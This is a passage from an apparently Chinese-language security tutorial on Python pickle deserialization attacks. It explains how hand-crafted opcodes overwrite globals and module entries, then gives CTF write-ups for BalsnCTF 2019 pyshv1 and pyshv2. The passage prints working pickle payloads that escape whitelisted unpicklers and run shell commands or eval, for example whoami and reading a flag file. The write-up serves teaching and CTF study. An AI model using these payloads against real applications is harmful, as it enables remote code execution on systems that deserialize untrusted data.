+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">PWD = <span class="hljs-string">&quot;???&quot;</span>  <span class="hljs-comment"># 已打码</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> obj.pwd == PWD:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>这个时候，可以通过 import <code>builtins</code> 来覆盖 <code>globals</code> 里的 <code>PWD</code>，转成代码就是这样：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><br>builtins.<span class="hljs-built_in">globals</span>()[<span class="hljs-string">&quot;PWD&quot;</span>] = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># 先把 PWD 改成一个值</span><br><br>obj.pwd = <span class="hljs-string">&quot;tr0y&quot;</span>  <span class="hljs-comment"># 再让 obj.pwd 也等于这个值</span><br></code></pre></td></tr></table></figure></p>
+<p>转成 opcode 就是：<code>cbuiltins\nglobals\n(tR(VPWD\nVtr0y\nu.</code>，但是还有一个问题，此时 obj 实际上是字典，它并没有 pwd 这个属性，所以在 if 判断的时候就会直接报错。</p>
+<p>解决的办法就是用 <code>0</code> 把栈里的 <code>builtins.globals()</code> 弹出，它已经完成了自己修改 PWD 值的使命；然后再压入一个 Target 实例，并让它的 pwd 属性等于 tr0y，这样就可以让 <code>obj.pwd</code> 的值与 PWD 一致：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u0c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>)\x81&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br>                                      ^<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/718dacd3-1f33-4952-ab51-94eb585e786c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这里你可能会想，<code>builtins.globals()</code> 是字典，而 Python 中一切皆对象，那么这个字典也是一个实例，这样岂不是也可以用 <code>b</code> 来给这个字典新增一个属性？这样 payload 就简洁得多：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cbuiltins<span class="hljs-symbol">\n</span>globals<span class="hljs-symbol">\n</span>(tR(VPWD<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>u&#125;(Vpwd<span class="hljs-symbol">\n</span>Vtr0y<span class="hljs-symbol">\n</span>ub.<br></code></pre></td></tr></table></figure><br />
+遗憾的是，前面提到过，<code>b</code> 是执行 <code>__dict__.update()</code>，而字典是没有 <code>__dict__</code> 这个属性的，所以没法通过 b 给它新增一个属性：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/4ba4c6a5-8e35-46df-8f21-f418b2661b8c.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当然，不仅变量可以被覆盖，方法也是可以被覆盖的。比如 <code>sys.modules.get("os")</code>，可以先用代码理清楚链路：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>p0 = sys.modules<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = p0<br><span class="hljs-keyword">import</span> sys<br>p0[<span class="hljs-string">&quot;sys&quot;</span>] = sys.get(<span class="hljs-string">&quot;os&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>转成 opcode：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/fe49557c-a78c-4dd7-a61e-3b29ba0ca6f0.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>注意这里的 import 了两次，只有第一次是真正执行了 sys 模块，然后载入内存，第二次是从 sys.modules 直接引入的。这个特性与 Python import 协议有关系，它由两个模块构成，查找器和加载器。导入详细机制可看资料 5。</p>
+<p>所以，这个思路要求对 Python 内置的一些属性、方法、模块有扎实的掌握。比如按照 Python 文档的意思来看，属性包括 <code>数据属性</code> 和 <code>方法</code>，所以严格来说，我们常说的<code>属性</code>一词，其实特指 <code>数据属性</code>（这一点没必要太纠结，反正大家都是这么说的）。还有，大家可能习惯性用 <code>dir()</code> 来查看属性和方法，其实它在参数不同的时候，查询的逻辑是不一样的：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/98a6e69c-927e-4960-ae87-e92636533d13.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>我一般是在 ipython 中用 <code>.*?</code> 来查看，例如 <code>os.*?</code>，这个结果是非常全的。</p>
+<p>另外特别注意的是，有些对象的 <code>__dict__</code> 属于 <code>mappingproxy</code> 类型，例如：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/37e7cf49-b026-40ee-990b-1f670522f221.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>如果直接用 <code>b</code> 这种对象进行属性修改的话，会抛出异常：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/7b7667a1-0feb-469e-b0b5-e83d084cfa38.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>查看 pickle 的源码（见资料 6）可知（注：pickle 源码中有 <code>_pickle</code>（即 cPickle）优先使用的逻辑，如果这个模块导入失败，才会使用这上面的 pickle。这两个模块的逻辑略有差异，如果想仔细对比需要看下 <code>_pickle</code> 的 C 源码），最终会执行 <code>inst_dict[intern(k)] = v</code>，而 mappingproxy 类型禁止这样操作：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b657bcaf-d4ba-4e2a-a317-06cd0002cf17.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>那么应该怎么办呢？再看源码，如果 <code>state</code> 是两个元素的元组，那么会执行 <code>state, slotstate = state</code>，如果此时 <code>state in [None, &#123;&#125;]</code>（由于 <code>_pickle</code> 逻辑问题，是没办法让 state 等于 <code>''</code>、<code>0</code> 等这种值的），那么就会跑去执行 <code>setattr(inst, k, v)</code>，这是 mappingproxy 类型允许的：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/ee98ebcb-fb16-4fc0-9436-d18b86626b6c.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 <code>cA\nb\n&#125;Va\nI1\nsb.</code> 应该改为 <code>cA\nb\n(N&#125;Va\nI1\ntsb.</code> 或者 <code>cA\nb\n(&#125;&#125;Va\nI1\ntsb.</code></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/3d00a59a-bb3c-4c71-93ee-e7eb1a7719c8.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h2 id="课后题">课后题</h2>
+<p>这三道题目是 2019 年的 BalsnCTF，非常经典的 Python 反序列化题，源码见资料 7</p>
+<h3 id="pyshv1">pyshv1</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><br>whitelist = []<br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;sys&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br></code></pre></td></tr></table></figure>
+<p>限制条件如下：</p>
+<ol type="1">
+<li>只能引入 sys 模块</li>
+<li>方法中不能有 <code>.</code></li>
+</ol>
+<p>这题比较简单，利用方法覆盖的思路，<code>sys.modules.get("os").system("whoami")</code> 就可以了，转为 opcode 即为：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR  # 到这里和上面方法覆盖中的 payload 一样<br>p1<span class="hljs-symbol">\n</span>0  # 把 os 存下来先，然后清空栈<br>g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g1<span class="hljs-symbol">\n</span>s   # 引入 sys.modules 并令 sys.modules[&quot;sys&quot;] = os，这个思路还是方法覆盖<br>csys<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>tR.  # 执行命令<br></code></pre></td></tr></table></figure></p>
+<p>在经过两轮覆盖 sys 之后，就可以执行任意命令了：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b27d5d62-53a7-4aab-9505-289c28ddca40.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h3 id="pyshv2">pyshv2</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- structs.py ----- </span><br><span class="hljs-comment"># structs.py 是一个空文件</span><br><br><br><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br></code></pre></td></tr></table></figure>
+<p>这道题难度提升了不少。限制如下：</p>
+<ol type="1">
+<li>只能引入 structs 模块</li>
+<li>方法中不能有 <code>.</code></li>
+</ol>
+<p>上一道题利用方法覆盖，依赖的是可引入模块中的某些特殊方法。我们先来看下 <code>structs</code> 都有哪些属性：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/58557963-7381-4e39-bfa1-d4bdcfcebee8.png!blog#width-zoom2" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>再看下都有哪些方法：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/e400d051-3362-46e3-af15-d0095180097f.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p><code>__builtins__</code>、<code>__getattribute__</code> 都是好东西。</p>
+<p>思路首先可以是 <code>structs.__builtins__["eval"]("__import__('os').system('whoami')")</code>，可是这里的 <code>"eval"</code> 是不好 get 的。</p>
+<p>我们可以从后往前推。</p>
+<p><code>("__import__('os').system('whoami')")</code>，这个好解决，用 <code>c</code> 就行了。重点是 <code>structs.__builtins__["eval"]</code> 这个怎么搞出来。由于自定义的 find_class 用到了 <code>__import__</code>，所以 <code>cstructs\n__builtins__</code> 就会执行 <code>__import__("structs")</code>。那么可以这样，首先，给 structs 加一个属性：<code>structs.__dict__["p0"] = structs.__builtins__</code>，再解开一层，给 structs 加一个属性：<code>structs.__dict__["p1"] = structs.__dict__["p0"].get</code>，那么 <code>cstructs\np1\n(Veval\ntR.</code> 就会执行 <code>structs.__builtins__.get("eval")</code>，所以这里的 opcode 就是：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cstructs<span class="hljs-symbol">\n</span>__dict__<span class="hljs-symbol">\n</span>p0<br>(Vp0<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>__builtins__<span class="hljs-symbol">\n</span>s<br>(Vp1<span class="hljs-symbol">\n</span>g0.get<span class="hljs-symbol">\n</span>s  # 这里是不行的<br>cstructs<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>(Veval<span class="hljs-symbol">\n</span>tR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure><br />
+遗憾的是，opcode 是不支持用 <code>.</code> 来取属性/方法的。</p>
+<p>所以现在的问题就变成了，<code>.get</code> 这个方法怎么搞出来。</p>
+<p>再看下 find_class：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">module = <span class="hljs-built_in">__import__</span>(module)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br></code></pre></td></tr></table></figure></p>
+<p>所以如果 module 是一个字典的话，那么 name 就可以置为 get，即 <code>__import__("structs")</code> 的结果应该是一个字典。而 <code>__import__</code> 是可以被替换的，<code>__getattribute__</code> 就派上了用场，令 <code>structs.__builtins__['__import__'] = structs.__getattribute__</code>。所以，我们还得给 structs 新增一个 structs 属性：<code>structs.__dict__["structs"] = structs.__builtins__</code>。</p>
+<p>到这里:<br />
+<code>__import__(module)</code> 等于<br />
+<code>structs.__getattribute__("structs")</code> 等于<br />
+<code>structs.__builtins__</code></p>
+<p>所以 module 已经是 <code>structs.__builtins__</code> 了，只需要让 <code>name = "get"</code> 即可拿到 <code>eval</code>：<br />
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># get flag</span><br><br><span class="hljs-section"># 收工</span><br>\ntR.<br></code></pre></td></tr></table></figure></p>
+<p>这样即可获得 flag<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> structs<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = [<span class="hljs-string">&quot;structs&quot;</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br>dumps = pickle.dumps<br><br>a = <span class="hljs-string">b&#x27;&#x27;&#x27;cstructs\n__dict__\nVstructs\ncstructs\n__builtins__\ns0cstructs\n__builtins__\nV__import__\ncstructs\n__getattribute__\ns0cstructs\nget\n(Veval\ntR(&#x27;&#x27;&#x27;</span> + \<br>    <span class="hljs-string">b&#x27;&#x27;&#x27;Vprint(open(&quot;./flag&quot;).read())\ntR.&#x27;&#x27;&#x27;</span><br>b = RestrictedUnpickler(io.BytesIO(a)).load()<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7803561-799c-4c0d-9e25-cee4ed6ac81d.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>如果只是为了拿到 flag，用 <code>open("./flag").read()</code> 也可以。但我们总是会想想能不能 RCE，那么这道题可以 RCE 吗？你可能会想，opcode 里面已经把 <code>__import__</code> 污染了，所以没法 import 其他的包来 RCE。</p>
